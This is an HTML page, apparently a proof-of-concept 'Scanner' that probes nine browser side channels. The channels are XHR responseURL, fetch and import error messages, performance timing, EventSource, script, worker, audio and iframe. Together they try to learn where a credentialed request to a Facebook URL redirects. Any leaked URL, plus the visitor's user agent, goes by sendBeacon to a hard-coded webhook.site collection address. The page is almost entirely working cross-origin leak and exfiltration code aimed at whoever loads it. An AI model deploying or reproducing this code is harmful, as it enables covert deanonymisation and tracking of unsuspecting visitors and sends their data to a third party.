<!DOCTYPE html>
<html>
<head>
    <meta charset='utf-8' />
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Scanner</title>
    <style>
        body { font-family: monospace; padding: 20px; color: #000; background: #fff; }
        .input-group { margin-bottom: 20px; }
        input { width: 100%; padding: 8px; margin: 5px 0; border: 1px solid #000; box-sizing: border-box; font-family: monospace; }
        .grid { display: grid; grid-template-columns: 1fr 1fr; gap: 10px; }
        button { padding: 10px; cursor: pointer; border: 1px solid #000; background: #fff; font-family: monospace; text-align: left; }
        button:active { background: #eee; }
        pre { margin-top: 20px; border: 1px solid #000; padding: 10px; min-height: 200px; white-space: pre-wrap; font-size: 12px; }
        .leak { background: #000; color: #fff; font-weight: bold; padding: 2px; }
    </style>
</head>
<body>

    <div class="input-group">
        <input type="text" id="target" value="https://fb.com/4">
        <input type="text" id="exfil" value="https://webhook.site/0d95c87e-8a54-4bb1-b4cf-964eecdb5594">
    </div>

    <div class="grid">
        <button onclick="testXHR()">1. XHR (responseURL)</button>
        <button onclick="testFetch()">2. Fetch (Error Msg)</button>
        <button onclick="testPerf()">3. Performance Timing</button>
        <button onclick="testES()">4. EventSource</button>
        <button onclick="testScript()">5. Script Error</button>
        <button onclick="testWorker()">6. Web Worker</button>
        <button onclick="testImport()">7. Dynamic Import</button>
        <button onclick="testAudio()">8. Audio Object</button>
        <button onclick="testIframe()">9. Iframe Location</button>
        <button onclick="clearLogs()">0. Clear Logs</button>
    </div>

    <pre id="logs"></pre>

    <script>
        const getT = () => document.getElementById('target').value;
        const getE = () => document.getElementById('exfil').value;
        const logArea = document.getElementById('logs');

        function out(msg, isLeak = false) {
            const span = document.createElement('span');
            if (isLeak) span.className = 'leak';
            span.innerText = `[${new Date().toLocaleTimeString()}] ${msg}\n`;
            logArea.appendChild(span);
            logArea.scrollTop = logArea.scrollHeight;
        }

        function send(data, type) {
            if (!data || data === getT()) return;
            out(`LEAK: ${data}`, true);
            navigator.sendBeacon(getE(), JSON.stringify({type, data, ua: navigator.userAgent}));
        }

        function clearLogs() { logArea.innerText = ''; }

        function testXHR() {
            out('Testing XHR...');
            const xhr = new XMLHttpRequest();
            xhr.open('GET', getT(), true);
            xhr.withCredentials = true;
            xhr.onreadystatechange = () => { if (xhr.responseURL) send(xhr.responseURL, 'XHR'); };
            xhr.onerror = () => { send(xhr.responseURL, 'XHR-Error'); };
            xhr.send();
        }

        function testFetch() {
            out('Testing Fetch...');
            fetch(getT(), { mode: 'cors', credentials: 'include' })
                .then(r => send(r.url, 'Fetch'))
                .catch(e => {
                    const m = e.message.match(/(https?:\/\/[^\s]+)/);
                    if (m) send(m[0], 'Fetch-Msg');
                    else out('Fetch Blocked: ' + e.message);
                });
        }

        function testPerf() {
            out('Testing PerformanceObserver...');
            const obs = new PerformanceObserver((l) => {
                l.getEntries().forEach(e => {
                    if (e.name !== getT() && e.name.startsWith('http')) send(e.name, 'Perf');
                });
            });
            obs.observe({ entryTypes: ['resource'] });
            fetch(getT(), { mode: 'no-cors' });
        }

        function testES() {
            out('Testing EventSource...');
            try {
                const es = new EventSource(getT());
                setTimeout(() => {
                    send(es.url, 'EventSource');
                    es.close();
                }, 1500);
            } catch(e) { out(e.message); }
        }

        function testScript() {
            out('Testing Script Tag...');
            const handler = (m, s) => {
                send(s, 'Script-Error');
                window.removeEventListener('error', handler);
            };
            window.addEventListener('error', handler);
            const s = document.createElement('script');
            s.src = getT();
            document.body.appendChild(s);
        }

        function testWorker() {
            out('Testing Worker...');
            try {
                const w = new Worker(getT());
                w.onerror = (e) => { send(e.filename, 'Worker'); };
            } catch (e) {
                const m = e.message.match(/(https?:\/\/[^\s]+)/);
                if (m) send(m[0], 'Worker-Catch');
            }
        }

        function testImport() {
            out('Testing Dynamic Import...');
            import(getT()).catch(e => {
                const m = e.message.match(/(https?:\/\/[^\s]+)/);
                if (m) send(m[0], 'Import-Leak');
                else out('Import Error: ' + e.message);
            });
        }

        function testAudio() {
            out('Testing Audio...');
            const a = new Audio();
            a.onerror = () => { send(a.src, 'Audio-Src-Error'); };
            a.src = getT();
        }

        function testIframe() {
            out('Testing Iframe...');
            const f = document.createElement('iframe');
            f.style.display = 'none';
            f.src = getT();
            f.onload = () => {
                try { out('Iframe URL: ' + f.contentWindow.location.href); } 
                catch(e) { out('Iframe SOP Blocked (Expected)'); }
            };
            document.body.appendChild(f);
        }
    </script>
</body>
</html>
